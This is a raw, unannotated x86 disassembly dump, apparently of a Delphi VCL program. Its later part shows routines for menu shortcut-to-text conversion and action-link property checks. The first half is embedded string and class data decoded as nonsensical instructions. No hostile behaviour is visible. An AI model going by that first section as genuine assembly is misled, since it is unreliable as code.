add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x7 ] al
inc esi
add ah ch
cmovbe eax [ eax ]
fcom [ 0x15200046 ]
inc esi
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
shl ah 0xc4
inc ebp
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0x98756e65
les eax [ ebp ]
or al 0xc4
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
jae r-xdata
insd
add al dl
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ esi + edi * 4 ] dh
inc ebp
add al al
adc al 0x46
push es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
adc [ eax ] al
inc eax
add [ eax ] al
[ eax ]
jns r-xdata
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] cl
add bh bh
adc [ fs : esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] al
cwde
xor al 0xbe
inc ebp
add al ah
adc al 0x46
add al dh
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
dec ecx
insd
popad
jae r-xdata
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
inc [ eax ]
adc eax 0x10046
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x75410900
je r-xdata
inc eax
add [ ecx ] al
add bh bh
pop esp
adc al 0x46
dec ebp
jb r-xdata
je r-xdata
outsb
je r-xdata
popad
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
dec eax
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x14 ]
inc esi
add [ eax + 0xd ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080006 ] al
lodsb [ esi ]
mov [ ebp ] 0xd
insd
popad
dec esp
je r-xdata
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ esi + eax * 8 ] ch
inc ebp
add [ esi ] al
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x4065646f
mov esp 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
nop
xor dh al
inc ebp
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
[ esp + edx + 0x46 ]
mov [ ebp ] 0x8d
inc eax
outsd
jo r-xdata
dec ebp
outsb
jne r-xdata
push esp
dec ebp
outsb
dec esp
je r-xdata
jne r-xdata
mov al 0xc6
inc ebp
add [ ebx ] al
jo r-xdata
or eax 0x6f42616d
insd
jo r-xdata
outsd
inc ebp
add [ ebx ] al
or al 0x54
push esp
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
insd
popad
inc edx
outsd
outsb
or [ eax + 0x61 ] dh
jo r-xdata
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
add [ eax ] ch
xor [ eax ] eax
xor al 0x1c
inc esi
add [ esp + ecx * 4 + 0x41 ] dl
add [ eax + 0xd ] al
inc edx
add [ eax - 0x75 ] dh
inc ecx
add [ eax + edx ] al
inc esi
add [ eax + 0x28004610 ] ah
push cs
inc edx
add [ eax ] ah
cmovb eax [ eax ]
push eax
adc [ edx ] eax
cmp [ esi ] cl
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add al al
sbb eax [ esi ]
in al dx
cmovbe eax [ eax ]
xor [ eax ] cl
inc esi
add [ eax + edx ] bl
inc esi
add [ eax + 0x1c ] ch
inc esi
add [ eax ] ah
sbb eax 0x540a0046
push eax
outsd
jo r-xdata
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
pop eax
retn
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
mov [ ebp ] 0x78
outsd
inc edx
outsd
je r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
imul ebp [ ebp + 0x61 ] 0x6e6f6974
jae r-xdata
inc ebx
outsb
push edx
imul esp [ edi + 0x68 ] 0x61700874
push esp
outsd
add al ah
adc al 0x46
add al dh
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add eax 0x756e654d
jae r-xdata
insd
popad
dec esi
outsd
outsb
add eax 0x756e654d
inc eax
add [ ebx + esi + 0x310c0040 ] ch
outsd
insd
jo r-xdata
je r-xdata
outsb
or al 0x74
bound ecx [ ebp + 0x66 ]
je r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
add al al
adc al 0x46
add al dl
adc al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jne r-xdata
outsd
sbb bh al
inc ebp
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esi + eax * 8 + 0x45 ] ch
add [ 0x69526274 ] cl
push 0x74754274
je r-xdata
je r-xdata
jne r-xdata
outsb
jne r-xdata
outsd
outsb
je r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
jo r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
inc eax
cmp [ ecx ] dl
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0xac004033
rol bh 0x1
inc ebp
add [ edi ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
andps xmm1 [ ebp + 0x65 ]
outsb
mov [ ebp ] 0x3
xor eax [ eax ]
or al 0x31
xor eax [ eax ]
mov [ edx ] cs
inc edx
add [ eax - 0x53ffbfcd ] bh
add [ edi + eax * 8 + 0x45 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ esi + eax * 8 + 0x408d0045 ] ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov [ ebp ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol bh 0x45
add [ eax ] bh
add [ eax ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] dl
inc eax
add [ eax ] al
add bh bh
sub [ edi ] cl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
jns r-xdata
add [ eax ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
jo r-xdata
outsb
add eax 0x756e654d
jae r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
push cs
push eax
popad
jb r-xdata
[ esp + edx + 0x46 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
cwde
movsd [ edi ] [ esi ]
inc ebp
add [ eax ] cl
add bh bh
adc [ fs : esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
push es
dec ecx
insd
popad
jae r-xdata
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
sub al 0x81
inc ecx
add al dl
add [ ecx ] 0x10
test [ ecx ] eax
add [ ecx - 0x7e03ffbf ] 0x41
add [ eax ] bh
push ss
inc esi
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x2465646f
push ebp
push esp
inc ecx
add [ eax ] dh
add [ eax ] al
dec [ eax + 0x14 ]
inc esi
add [ eax + 0xd ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
inc ecx
add [ esp + ebx + 0x46 ] bh
add [ esp + ebx + 0x10046 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x55
xor al 0xbe
inc ebp
add [ eax ] al
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
0x45
jo r-xdata
inc ebx
push 0x65676e61
nop
push ebp
inc ecx
add [ eax ] dh
add bh bh
jo r-xdata
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6c65646f
mov [ ebp ] 0x68
add [ eax ] al
[ eax ]
inc ecx
add [ eax ] al
add [ edx ] cl
add [ 0x756e654d ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
mov [ ebp ] 0xff000069
imul eax [ eax ] 0x1ff00
add [ ecx ] dh
xor dh [ ebx ]
xor al 0x35
aaa
cmp [ ecx ] bh
xor [ ecx + 0x42 ] al
inc ebx
inc esp
inc ebp
inc esi
inc edi
dec eax
dec ecx
dec edx
dec ebx
dec esp
dec ebp
dec esi
dec edi
push eax
push ecx
push edx
push ebx
push esp
push ebp
push esi
push edi
pop eax
pop ecx
pop edx
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ebx + ebx * 2 ] dl
outsb
inc eax
mov esp 0x500045
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
adc [ eax ] al
inc ecx
add [ eax ] al
outsb
push edx
jne r-xdata
mov [ ebp ] r-xdata
adc [ eax ] al
add eax 0x756e654d
jae r-xdata
je r-xdata
shl [ eax ] 0xca
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 8 ] dh
inc ebp
add [ eax + eax ] dl
add [ eax ] al
adc al 0x5b
mov ah 0x96
inc edx
add [ eax ] bl
xchg edi eax
inc edx
add al bh
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x45ca8c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80045ca ] bl
add [ eax ] al
add [ ebp + edx * 4 + 0x42 ] dh
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
xor al 0xbe
inc ebp
add [ esi + eax * 8 ] ch
inc ebp
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
test ebx ebx
je r-xdata
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
outsd
mov eax esi
pop edi
pop esi
pop ebx
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_451708
mov esi eax
test esi esi
jne r-xdata
retn
insd
push ebx
je r-xdata
mov esi ebx
arpl [ ebx - 0x70 ] bp
sub_45cad8
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_44beac
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_451708
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_45cb30
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_45cb68
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403eec
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40415c
sub_45cbbc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_45cda5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f84
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4040d4
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f84
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f84
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4040d4
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4040d4
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403eec
mov eax esi
call sub_403eec
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f84
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407f80
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4041f8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_45cb68
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b4
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f84
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b4
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_4041b4
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4041b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cdac
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f10
retn
sub_45cdc0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_4041ac
push eax
mov eax edi
call sub_4041ac
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4041ac
push eax
mov eax edi
call sub_4043ac
push eax
mov eax [ esi ]
call sub_4043ac
pop edx
pop ecx
call sub_407e60
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_4041ac
mov ecx eax
mov eax esi
mov edx 0x1
call sub_40444c
sub_45ce1c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_45cef7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_45cdc0
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45cdc0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45cdc0
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_45cdc0
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45cefe
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_45cbbc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407e10
test eax eax
jne r-xdata
sub_45cf34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_45f4d4
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_45f4e4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_45cf94
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_45f4d4
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_45f4d4
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f4e4
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f4e4
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_45cf34
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_45cf34
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_45f4e4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_45f4e4
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_45d0e0
push ebx
mov ebx eax
mov eax ebx
call sub_459c34
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_461ff0
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_45d118
push ebx
mov ebx eax
mov eax ebx
call sub_459c48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d148
push ebx
mov ebx eax
mov eax ebx
call sub_459c5c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d178
push ebx
mov ebx eax
mov eax ebx
call sub_459c84
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d1a8
push ebx
mov ebx eax
mov eax ebx
call sub_459cac
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4042f8
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d1dc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_459c70
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d218
push ebx
mov ebx eax
mov eax ebx
call sub_459cc0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d24c
push ebx
mov ebx eax
mov eax ebx
call sub_459cd4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d280
push ebx
mov ebx eax
mov eax ebx
call sub_459ce8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d2b4
push ebx
mov ebx eax
mov eax ebx
call sub_4212b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_45d2dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_45d2fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f33c
sub_45d31c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f3ac
sub_45d33c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f400
sub_45d35c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_45d378
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f40
sub_45d39c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f52c
sub_45d3bc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45f508
sub_45d3dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45f51c
sub_45d3fc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_45d428
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4209c8
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_45cf14
mov [ ebx + 0x50 ] ax
